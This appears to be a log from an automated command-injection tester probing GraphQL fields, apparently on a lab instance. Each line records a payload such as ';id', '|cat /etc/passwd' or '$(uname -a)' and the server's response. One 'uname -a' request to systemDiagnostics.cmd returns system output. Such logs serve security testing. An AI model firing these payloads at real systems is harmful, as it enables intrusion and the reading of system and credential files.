2026-02-02 23:16:06,118 | INFO    | InjectionTester      | semicolon_id                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[;id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,130 | INFO    | InjectionTester      | pipe_id                        | systemDiagnostics.password | POST | success  |  0.012s | payload=[|id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,141 | INFO    | InjectionTester      | double_pipe_id                 | systemDiagnostics.password | POST | success  |  0.010s | payload=[||id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,151 | INFO    | InjectionTester      | and_id                         | systemDiagnostics.password | POST | success  |  0.010s | payload=[&& id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,161 | INFO    | InjectionTester      | semicolon_cat_passwd           | systemDiagnostics.password | POST | success  |  0.010s | payload=[;cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,172 | INFO    | InjectionTester      | pipe_cat_passwd                | systemDiagnostics.password | POST | success  |  0.011s | payload=[|cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,183 | INFO    | InjectionTester      | double_pipe_cat_passwd         | systemDiagnostics.password | POST | success  |  0.010s | payload=[||cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,194 | INFO    | InjectionTester      | and_cat_passwd                 | systemDiagnostics.password | POST | success  |  0.010s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,204 | INFO    | InjectionTester      | semicolon_uname                | systemDiagnostics.password | POST | success  |  0.010s | payload=[;uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,213 | INFO    | InjectionTester      | pipe_uname                     | systemDiagnostics.password | POST | success  |  0.009s | payload=[|uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,224 | INFO    | InjectionTester      | double_pipe_uname              | systemDiagnostics.password | POST | success  |  0.010s | payload=[||uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,236 | INFO    | InjectionTester      | and_uname                      | systemDiagnostics.password | POST | success  |  0.012s | payload=[&& uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,246 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDiagnostics.password | POST | success  |  0.010s | payload=[`cat /etc/passwd`] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,256 | INFO    | InjectionTester      | backtick_id                    | systemDiagnostics.password | POST | success  |  0.009s | payload=[`id`] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,267 | INFO    | InjectionTester      | backtick_uname                 | systemDiagnostics.password | POST | success  |  0.010s | payload=[`uname -a`] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,276 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDiagnostics.password | POST | success  |  0.009s | payload=[$(cat /etc/passwd)] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,286 | INFO    | InjectionTester      | dollar_id                      | systemDiagnostics.password | POST | success  |  0.009s | payload=[$(id)] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,296 | INFO    | InjectionTester      | dollar_uname                   | systemDiagnostics.password | POST | success  |  0.010s | payload=[$(uname -a)] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,307 | INFO    | InjectionTester      | plain_uname                    | systemDiagnostics.password | POST | success  |  0.011s | payload=[uname -a] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,317 | INFO    | InjectionTester      | chain_semicolon                | systemDiagnostics.password | POST | success  |  0.010s | payload=[;cat /etc/passwd;id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,326 | INFO    | InjectionTester      | chain_pipe                     | systemDiagnostics.password | POST | success  |  0.009s | payload=[|cat /etc/passwd|id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,337 | INFO    | InjectionTester      | chain_and                      | systemDiagnostics.password | POST | success  |  0.010s | payload=[&&cat /etc/passwd&&id] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,347 | INFO    | InjectionTester      | plain_cat_passwd               | systemDiagnostics.password | POST | success  |  0.010s | payload=[cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,358 | INFO    | InjectionTester      | space_semicolon_cat            | systemDiagnostics.password | POST | success  |  0.010s | payload=[; cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,367 | INFO    | InjectionTester      | space_pipe_cat                 | systemDiagnostics.password | POST | success  |  0.009s | payload=[| cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,378 | INFO    | InjectionTester      | space_and_cat                  | systemDiagnostics.password | POST | success  |  0.010s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": "Password Incorrect"}}]
2026-02-02 23:16:06,388 | INFO    | InjectionTester      | semicolon_id                   | systemDiagnostics.cmd | POST | success  |  0.010s | payload=[;id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,402 | INFO    | InjectionTester      | pipe_id                        | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[|id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,414 | INFO    | InjectionTester      | double_pipe_id                 | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[||id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,427 | INFO    | InjectionTester      | and_id                         | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[&& id] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,439 | INFO    | InjectionTester      | semicolon_cat_passwd           | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[;cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,450 | INFO    | InjectionTester      | pipe_cat_passwd                | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[|cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,462 | INFO    | InjectionTester      | double_pipe_cat_passwd         | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[||cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,473 | INFO    | InjectionTester      | and_cat_passwd                 | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[&& cat /etc/passwd] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,485 | INFO    | InjectionTester      | semicolon_uname                | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[;uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,497 | INFO    | InjectionTester      | pipe_uname                     | systemDiagnostics.cmd | POST | success  |  0.011s | payload=[|uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,509 | INFO    | InjectionTester      | double_pipe_uname              | systemDiagnostics.cmd | POST | success  |  0.012s | payload=[||uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,522 | INFO    | InjectionTester      | and_uname                      | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[&& uname -a] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,536 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[`cat /etc/passwd`] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,550 | INFO    | InjectionTester      | backtick_id                    | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[`id`] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,565 | INFO    | InjectionTester      | backtick_uname                 | systemDiagnostics.cmd | POST | success  |  0.014s | payload=[`uname -a`] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,578 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[$(cat /etc/passwd)] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,595 | INFO    | InjectionTester      | dollar_id                      | systemDiagnostics.cmd | POST | success  |  0.016s | payload=[$(id)] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,608 | INFO    | InjectionTester      | dollar_uname                   | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[$(uname -a)] response=[{"data": {"systemDiagnostics": ""}}]
2026-02-02 23:16:06,622 | INFO    | InjectionTester      | plain_uname                    | systemDiagnostics.cmd | POST | success  |  0.013s | payload=[uname -a] response=[{"data": {"systemDiagnostics": "Linux 16f4be6335ec 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 GNU/Linux\n"}}]
2026-02-02 23:16:06,625 | INFO    | InjectionTester      | semicolon_id                   | systemDebug.arg      | POST | success  |  0.003s | payload=[;id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 33}]}]}]
2026-02-02 23:16:06,628 | INFO    | InjectionTester      | pipe_id                        | systemDebug.arg      | POST | success  |  0.002s | payload=[|id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 33}]}]}]
2026-02-02 23:16:06,631 | INFO    | InjectionTester      | double_pipe_id                 | systemDebug.arg      | POST | success  |  0.002s | payload=[||id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 34}]}]}]
2026-02-02 23:16:06,633 | INFO    | InjectionTester      | and_id                         | systemDebug.arg      | POST | success  |  0.002s | payload=[&& id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 35}]}]}]
2026-02-02 23:16:06,636 | INFO    | InjectionTester      | semicolon_cat_passwd           | systemDebug.arg      | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 46}]}]}]
2026-02-02 23:16:06,639 | INFO    | InjectionTester      | pipe_cat_passwd                | systemDebug.arg      | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 46}]}]}]
2026-02-02 23:16:06,642 | INFO    | InjectionTester      | double_pipe_cat_passwd         | systemDebug.arg      | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-02 23:16:06,645 | INFO    | InjectionTester      | and_cat_passwd                 | systemDebug.arg      | POST | success  |  0.002s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 48}]}]}]
2026-02-02 23:16:06,647 | INFO    | InjectionTester      | semicolon_uname                | systemDebug.arg      | POST | success  |  0.002s | payload=[;uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 39}]}]}]
2026-02-02 23:16:06,650 | INFO    | InjectionTester      | pipe_uname                     | systemDebug.arg      | POST | success  |  0.002s | payload=[|uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 39}]}]}]
2026-02-02 23:16:06,653 | INFO    | InjectionTester      | double_pipe_uname              | systemDebug.arg      | POST | success  |  0.002s | payload=[||uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 40}]}]}]
2026-02-02 23:16:06,655 | INFO    | InjectionTester      | and_uname                      | systemDebug.arg      | POST | success  |  0.002s | payload=[&& uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 41}]}]}]
2026-02-02 23:16:06,658 | INFO    | InjectionTester      | backtick_cat_passwd            | systemDebug.arg      | POST | success  |  0.002s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-02 23:16:06,660 | INFO    | InjectionTester      | backtick_id                    | systemDebug.arg      | POST | success  |  0.002s | payload=[`id`] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 34}]}]}]
2026-02-02 23:16:06,663 | INFO    | InjectionTester      | backtick_uname                 | systemDebug.arg      | POST | success  |  0.002s | payload=[`uname -a`] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 40}]}]}]
2026-02-02 23:16:06,666 | INFO    | InjectionTester      | dollar_cat_passwd              | systemDebug.arg      | POST | success  |  0.002s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 48}]}]}]
2026-02-02 23:16:06,668 | INFO    | InjectionTester      | dollar_id                      | systemDebug.arg      | POST | success  |  0.002s | payload=[$(id)] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 35}]}]}]
2026-02-02 23:16:06,671 | INFO    | InjectionTester      | dollar_uname                   | systemDebug.arg      | POST | success  |  0.002s | payload=[$(uname -a)] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 41}]}]}]
2026-02-02 23:16:06,673 | INFO    | InjectionTester      | plain_uname                    | systemDebug.arg      | POST | success  |  0.002s | payload=[uname -a] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 38}]}]}]
2026-02-02 23:16:06,676 | INFO    | InjectionTester      | chain_semicolon                | systemDebug.arg      | POST | success  |  0.002s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 49}]}]}]
2026-02-02 23:16:06,678 | INFO    | InjectionTester      | chain_pipe                     | systemDebug.arg      | POST | success  |  0.002s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 49}]}]}]
2026-02-02 23:16:06,681 | INFO    | InjectionTester      | chain_and                      | systemDebug.arg      | POST | success  |  0.002s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 51}]}]}]
2026-02-02 23:16:06,684 | INFO    | InjectionTester      | plain_cat_passwd               | systemDebug.arg      | POST | success  |  0.002s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 45}]}]}]
2026-02-02 23:16:06,686 | INFO    | InjectionTester      | space_semicolon_cat            | systemDebug.arg      | POST | success  |  0.002s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-02 23:16:06,689 | INFO    | InjectionTester      | space_pipe_cat                 | systemDebug.arg      | POST | success  |  0.002s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 47}]}]}]
2026-02-02 23:16:06,691 | INFO    | InjectionTester      | space_and_cat                  | systemDebug.arg      | POST | success  |  0.002s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Field \"systemDebug\" of type \"String\" must not have a sub selection.", "locations": [{"line": 1, "column": 48}]}]}]
2026-02-02 23:16:06,694 | INFO    | InjectionTester      | semicolon_id                   | search.keyword       | POST | success  |  0.002s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 34}]}, {…]
2026-02-02 23:16:06,697 | INFO    | InjectionTester      | pipe_id                        | search.keyword       | POST | success  |  0.002s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 34}]}, {…]
2026-02-02 23:16:06,699 | INFO    | InjectionTester      | double_pipe_id                 | search.keyword       | POST | success  |  0.002s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 35}]}, {…]
2026-02-02 23:16:06,702 | INFO    | InjectionTester      | and_id                         | search.keyword       | POST | success  |  0.002s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 36}]}, {…]
2026-02-02 23:16:06,705 | INFO    | InjectionTester      | semicolon_cat_passwd           | search.keyword       | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 47}]}, {…]
2026-02-02 23:16:06,708 | INFO    | InjectionTester      | pipe_cat_passwd                | search.keyword       | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 47}]}, {…]
2026-02-02 23:16:06,711 | INFO    | InjectionTester      | double_pipe_cat_passwd         | search.keyword       | POST | success  |  0.002s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 48}]}, {…]
2026-02-02 23:16:06,714 | INFO    | InjectionTester      | and_cat_passwd                 | search.keyword       | POST | success  |  0.002s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 49}]}, {…]
2026-02-02 23:16:06,716 | INFO    | InjectionTester      | semicolon_uname                | search.keyword       | POST | success  |  0.003s | payload=[;uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 40}]}, {…]
2026-02-02 23:16:06,719 | INFO    | InjectionTester      | pipe_uname                     | search.keyword       | POST | success  |  0.002s | payload=[|uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 40}]}, {…]
2026-02-02 23:16:06,723 | INFO    | InjectionTester      | double_pipe_uname              | search.keyword       | POST | success  |  0.003s | payload=[||uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 41}]}, {…]
2026-02-02 23:16:06,725 | INFO    | InjectionTester      | and_uname                      | search.keyword       | POST | success  |  0.003s | payload=[&& uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 42}]}, {…]
2026-02-02 23:16:06,728 | INFO    | InjectionTester      | backtick_cat_passwd            | search.keyword       | POST | success  |  0.002s | payload=[`cat /etc/passwd`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 48}]}, {…]
2026-02-02 23:16:06,731 | INFO    | InjectionTester      | backtick_id                    | search.keyword       | POST | success  |  0.002s | payload=[`id`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 35}]}, {…]
2026-02-02 23:16:06,733 | INFO    | InjectionTester      | backtick_uname                 | search.keyword       | POST | success  |  0.002s | payload=[`uname -a`] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 41}]}, {…]
2026-02-02 23:16:06,736 | INFO    | InjectionTester      | dollar_cat_passwd              | search.keyword       | POST | success  |  0.002s | payload=[$(cat /etc/passwd)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 49}]}, {…]
2026-02-02 23:16:06,739 | INFO    | InjectionTester      | dollar_id                      | search.keyword       | POST | success  |  0.002s | payload=[$(id)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 36}]}, {…]
2026-02-02 23:16:06,741 | INFO    | InjectionTester      | dollar_uname                   | search.keyword       | POST | success  |  0.002s | payload=[$(uname -a)] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 42}]}, {…]
2026-02-02 23:16:06,744 | INFO    | InjectionTester      | plain_uname                    | search.keyword       | POST | success  |  0.002s | payload=[uname -a] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 39}]}, {…]
2026-02-02 23:16:06,747 | INFO    | InjectionTester      | chain_semicolon                | search.keyword       | POST | success  |  0.002s | payload=[;cat /etc/passwd;id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 50}]}, {…]
2026-02-02 23:16:06,749 | INFO    | InjectionTester      | chain_pipe                     | search.keyword       | POST | success  |  0.002s | payload=[|cat /etc/passwd|id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 50}]}, {…]
2026-02-02 23:16:06,752 | INFO    | InjectionTester      | chain_and                      | search.keyword       | POST | success  |  0.002s | payload=[&&cat /etc/passwd&&id] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 52}]}, {…]
2026-02-02 23:16:06,755 | INFO    | InjectionTester      | plain_cat_passwd               | search.keyword       | POST | success  |  0.002s | payload=[cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 46}]}, {…]
2026-02-02 23:16:06,757 | INFO    | InjectionTester      | space_semicolon_cat            | search.keyword       | POST | success  |  0.002s | payload=[; cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 48}]}, {…]
2026-02-02 23:16:06,760 | INFO    | InjectionTester      | space_pipe_cat                 | search.keyword       | POST | success  |  0.002s | payload=[| cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 48}]}, {…]
2026-02-02 23:16:06,762 | INFO    | InjectionTester      | space_and_cat                  | search.keyword       | POST | success  |  0.002s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"id\" on type \"SearchResult\". Did you mean to use an inline fragment on \"PasteObject\" or \"UserObject\"?", "locations": [{"line": 1, "column": 49}]}, {…]
2026-02-02 23:16:06,765 | INFO    | InjectionTester      | semicolon_id                   | me.token             | POST | success  |  0.002s | payload=[;id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 31}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,768 | INFO    | InjectionTester      | pipe_id                        | me.token             | POST | success  |  0.003s | payload=[|id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 31}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,771 | INFO    | InjectionTester      | double_pipe_id                 | me.token             | POST | success  |  0.003s | payload=[||id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 32}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,774 | INFO    | InjectionTester      | and_id                         | me.token             | POST | success  |  0.003s | payload=[&& id] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 33}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,778 | INFO    | InjectionTester      | semicolon_cat_passwd           | me.token             | POST | success  |  0.003s | payload=[;cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 44}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,781 | INFO    | InjectionTester      | pipe_cat_passwd                | me.token             | POST | success  |  0.003s | payload=[|cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 44}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,784 | INFO    | InjectionTester      | double_pipe_cat_passwd         | me.token             | POST | success  |  0.003s | payload=[||cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 45}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
2026-02-02 23:16:06,787 | INFO    | InjectionTester      | and_cat_passwd                 | me.token             | POST | success  |  0.003s | payload=[&& cat /etc/passwd] response=[{"errors": [{"message": "Cannot query field \"message\" on type \"UserObject\".", "locations": [{"line": 1, "column": 46}]}, {"message": "Cannot query field \"error\" on type \"UserObject\".", "locati…]
